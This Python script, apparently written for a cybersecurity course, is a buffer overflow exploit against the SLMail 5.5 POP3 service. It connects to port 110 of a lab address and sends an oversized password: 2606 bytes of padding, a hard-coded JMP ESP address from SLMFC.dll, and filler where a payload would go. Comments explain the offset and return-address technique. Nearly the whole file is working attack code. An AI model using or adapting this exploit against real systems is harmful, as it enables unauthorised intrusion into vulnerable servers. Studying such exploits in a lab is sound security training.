# Programming For Cybersecurity course - Project
# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
#
# Author: Tomasz
#
#  Next step requires that we find an instruction to which we could redirect execution flow.
#  We need an address of return istruction. If we redirect EIP to this address JMP ESP will be executed
#  which will lead execution flow to our payload. We can use Moda module with Immunity debugger to find address of JMP ESP (opcode is \xff\xe4)
#  In our case 0x5f4a358f in SLMFC.dll contains a JMP ESP instruction
# 

import sys
import socket

try:
    #Buffer to be sent towards the target 
    #buffer = 'A' * 4000
    
    # Kali Linux command - "msf-pattern_create -l 4000"
    
    offset = 2606       # offset to feel the buffer before eip
    #eip  = 'B' * 4 
    

    # JMP ESP replaced EIP (our B's). x86 architecture stores addresses in little endian format so we reversed order of JMP ESP address
    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + 'C' * (4000 - 2606 - 4)   
 
    TARGET = '192.168.100.1' 
    PORT = 110
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    data = s.recv(1024)
    
    s.send('USER username'+'\r\n')                  # Send Username
    data = s.recv(1024)
    
    s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
    s.close()
except:
    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')